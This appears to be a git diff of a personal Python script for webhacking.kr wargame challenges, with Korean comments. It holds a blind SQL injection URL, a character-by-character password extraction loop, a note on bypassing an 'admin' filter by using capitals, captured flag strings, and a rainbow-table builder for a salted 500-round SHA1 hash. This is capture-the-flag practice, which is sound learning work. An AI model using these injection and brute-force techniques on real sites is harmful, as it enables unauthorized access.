@@ -1,4 +1,5 @@
 import requests
+import hashlib
 url="https://webhacking.kr/challenge/web-31/rank.php?score=1%20and%20"
 
 
@@ -52,12 +53,11 @@ print(passwd) 원하는 값
 '''
 
 #아이디 비번 알아내서 로그인할려했는데 admin이 필터링 되어있는듯 로그인이 안됨. 그래서 ADMIN 대문자로 했더니 성공!(아마 MSSQL에 대소문자 처리 안되어있어서 php에서만 admin을 거르는것 같음)
-print(chr(37))
 password= "FLAG_himIKO_tO_a_is_cuT__doNT_yOU_tHIN__sO_}"
 password2="flag{HIM_ko_tO_a_is_cuT__doNT_yOU_tHIN__sO_}"
 passwd="flag{"
 url="https://webhacking.kr/challenge/web-33/index.php?"
-
+'''
 print(password2.lower())
 for i in range(1,50): #원래는 1 부터 길이+1 까지
     for j in range(65, 96): #hex변환할 글자 33 = !, 126 = ~(전까지) format(j,'x')
@@ -71,3 +71,17 @@ for i in range(1,50): #원래는 1 부터 길이+1 까지
             break
 
 print(passwd)
+'''
+url="https://webhacking.kr/challenge/web-04/index.php?"
+def sha(no): ## sha값 계산, 500번
+    data = f"{no}salt_for_you"
+    for i in range(0,500):
+        data = hashlib.sha1(data.encode('utf-8')).hexdigest()
+    return data
+#레인보우 테이블 만들기
+f= open("dictionary.txt","w")
+for i in range(10000000, 99999999):
+    f.write(f"{i}: {sha(i)}\n") #{no}salt_for_you를 500번 해쉬한값을 모두 저장
+    print(i)
+f.close()
+
